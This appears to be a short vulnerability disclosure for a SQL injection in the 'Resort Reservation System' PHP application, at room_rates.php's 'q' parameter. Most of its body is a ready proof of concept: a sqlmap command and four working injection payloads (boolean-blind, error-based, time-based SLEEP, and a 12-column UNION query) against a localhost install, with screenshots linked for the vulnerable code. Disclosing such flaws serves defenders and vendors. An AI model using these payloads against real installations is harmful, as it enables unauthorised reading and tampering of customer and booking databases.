### Resort Reservation System - SQLi

### Date: 2026-02-27
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/12707/resort-reservation-system-paypalcredit-carddebit-card-payment.html
### Tested on: MacOs13.5 + phpstudy

# /room_rates.php（SQLI）

### Sample request POC #1

```
sqlmap -u "http://localhost:8889/TubiganGarden/?p=rooms&q=*" --batch


---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: http://localhost:8889/TubiganGarden/?p=rooms&q=' AND 5229=5229#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://localhost:8889/TubiganGarden/?p=rooms&q=' AND GTID_SUBSET(CONCAT(0x716a6b6b71,(SELECT (ELT(4510=4510,1))),0x7176626271),4510)-- EyJE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://localhost:8889/TubiganGarden/?p=rooms&q=' AND (SELECT 8576 FROM (SELECT(SLEEP(5)))nhcE)-- BQBB

    Type: UNION query
    Title: MySQL UNION query (NULL) - 12 columns
    Payload: http://localhost:8889/TubiganGarden/?p=rooms&q=' UNION ALL SELECT CONCAT(0x716a6b6b71,0x4f72526478424179595444425270714371725a7648766b5147444c48617161654d69666771574d57,0x7176626271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
---

```

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260227-150523.png "Resort Reservation System")

### Vulnerability code
room_rates.php:55
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260227-150622.png "Resort Reservation System")
